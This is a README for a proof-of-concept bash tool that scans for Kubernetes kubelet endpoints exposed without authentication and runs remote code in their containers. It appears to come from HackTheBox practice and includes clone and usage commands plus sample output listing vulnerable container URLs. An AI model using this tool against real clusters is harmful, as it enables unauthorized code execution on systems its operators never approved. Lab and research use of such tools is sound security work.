# [PoC] - Kubelet-unauthenticated-RCE-exploit  
This script aims to automate the vulnerability enumeration and exploitation.  
It allows detecting vulnerable targets from an ip and remotely execute code if a vulnerable url is given.  

**Tested in HackTheBox - SteamCloud (Easy)**
## Requirements
**Kubeletctl**  
```bash
  https://github.com/cyberark/kubeletctl
```
Go to releases(right) and download the one that fits your system.  
**Note:** in order to use **kubectl** from anywhere make sure you put the file in your $PATH
## Setup

**Clone the repository(or just copy the script)**

```bash
  sudo git clone https://github.com/Gurguii/Kubelet-unauthenticated-RCE-exploit
```
**Go to the project directory**
```bash
  cd Kubelet-unauthenticated-RCE-exploit
```
## Usage 
- Checking if target is vulnerable
```bashi
  bash kubelpwn.sh -i <targetIP>
```
#### Vulnerable target output example:
```bashi
    hack@hack:~$ bash kubelpwn.sh -i 10.10.10.10
    [!] Starting checks  
    [!] Found one => https://10.10.10.10:10250/run/namespace1/pod1/container1  
    [!] Found one => https://10.10.11.133:10250/run/namespace2/pod2/container2
```
-  RCE on target  
```bashi
    bash kubelpwn.sh -r <vulnerableURL>
```
#### RCE example:
```bashi
    hack@hack:~$ bash kubelpwn.sh -r https://10.10.10.10:10250/run/namespace1/pod1/container1
```
![image](https://user-images.githubusercontent.com/101645735/176478074-06b15e02-f290-4e23-a76f-b4aa3b6b11c4.png)
